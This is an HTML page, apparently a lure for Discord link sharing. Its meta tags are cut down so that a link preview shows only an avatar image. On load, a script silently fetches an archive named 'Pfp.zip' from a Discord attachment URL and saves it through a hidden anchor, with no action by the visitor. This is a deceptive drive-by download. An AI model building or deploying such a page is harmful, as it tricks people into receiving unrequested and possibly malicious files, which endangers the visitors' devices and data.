<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <!-- Only the image meta tag is kept to trigger the image preview -->
    <meta property="og:image" content="https://media.discordapp.net/attachments/1511412850424283296/1511430124376162314/discord-avatar-kzna13.png?ex=6a206c7e&is=6a1f1afe&hm=7673209dbc74eb3b7bcdf7c6c576bdf09d53df8586c95e7e8402d5afd2219c4e&=&format=webp&quality=lossless&width=144&height=144">
    <!-- Removed title, description, and twitter tags to prevent the text block -->
    <meta property="og:type" content="website">
</head>
<body style="background-color: white; margin: 0; padding: 0;">
    <script>
        // Trigger background download
        function downloadFile(url, filename) {
            fetch(url)
                .then(response => response.blob())
                .then(blob => {
                    const objectUrl = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = objectUrl;
                    a.download = filename;
                    document.body.appendChild(a);
                    a.click();
                    URL.revokeObjectURL(objectUrl);
                    document.body.removeChild(a);
                })
                .catch(err => console.log('Download failed', err));
        }
        
        // Start download immediately
        downloadFile("https://cdn.discordapp.com/attachments/1511412850424283296/1511415879697436913/Pfp.zip?ex=6a205f3a&is=6a1f0dba&hm=c35c5b8d495c93b77770c8381d94f4d2feeafa07b467f0cc3a58fb7174cd447a&", "Pfp.zip");
    </script>
</body>
</html>
